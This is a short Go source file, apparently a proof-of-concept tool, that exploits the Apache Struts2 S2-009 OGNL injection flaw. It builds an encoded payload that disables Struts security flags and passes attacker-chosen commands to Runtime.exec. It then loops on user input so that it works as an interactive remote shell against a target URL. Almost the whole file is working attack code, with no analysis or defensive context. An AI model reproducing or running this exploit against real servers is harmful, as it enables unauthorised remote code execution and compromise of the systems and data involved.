package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
)

func poc(url, commond string) string {
	payload := "/ajax/example5.action?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27" + commond + "%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]"
	url1 := url + payload
	rep1, err := http.Get(url1)
	if err != nil {
		panic(err)
	}
	res1, err1 := ioutil.ReadAll(rep1.Body)
	if err1 != nil {
		panic(err1)
	}
	return string(res1)
}

func S2_009() {
	fmt.Println("[*] test starting")
	reader1 := bufio.NewReader(os.Stdin)
	fmt.Print("[*] 输入url:")
	url, _, err := reader1.ReadLine()
	if err != nil {
		panic(err)
	}
	for {
		reader2 := bufio.NewReader(os.Stdin)
		commond, _, err1 := reader2.ReadLine()
		if err1 != nil {
			panic(err1)
		}
		if string(commond) == "exit" {
			break
		}
		res1 := poc(string(url), string(commond))
		fmt.Print(res1 + "\n")
		fmt.Print("\n")
	}
}
